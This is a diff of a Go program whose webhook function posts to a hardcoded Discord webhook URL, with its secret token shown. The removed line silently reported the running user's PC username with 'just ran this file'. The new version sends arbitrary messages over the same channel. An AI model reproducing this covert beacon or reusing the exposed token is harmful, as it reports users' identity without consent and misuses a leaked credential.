@@ -3,15 +3,15 @@ package main
 import (
 	"bytes"
 	"encoding/json"
+	"io/ioutil"
 	"log"
 	"net/http"
-  "ioutil"
 )
 
-func webhook() {
+func webhook(message string) {
 	url := "https://discord.com/api/webhooks/1099773326165016698/7wiIuiCQyNFx4cJ27BnxHFLlYLwXb-M2wvsSMNQ0hSg7o1C86rw-VSJffTMPUUD-6IWN"
 
-	values := map[string]string{"content": getPcUsername() + " just ran this file", "username": "why"}
+	values := map[string]string{"content": message, "username": "why"}
 	postJson(url, values)
 }
 
@@ -40,14 +40,14 @@ func postJson(url string, data map[string]string) {
 }
 
 func getRequest(url string) string {
-  response, err := http.Get(url)
-  if err != nil {
-      log.Fatalln(err)
-  }
-  body, err := ioutil.ReadAll(response.Body)
-  if err != nil {
-      log.Fatalln(err)
-  }
-  str := string(body)
-  return str;
+	response, err := http.Get(url)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	body, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	str := string(body)
+	return str
 }
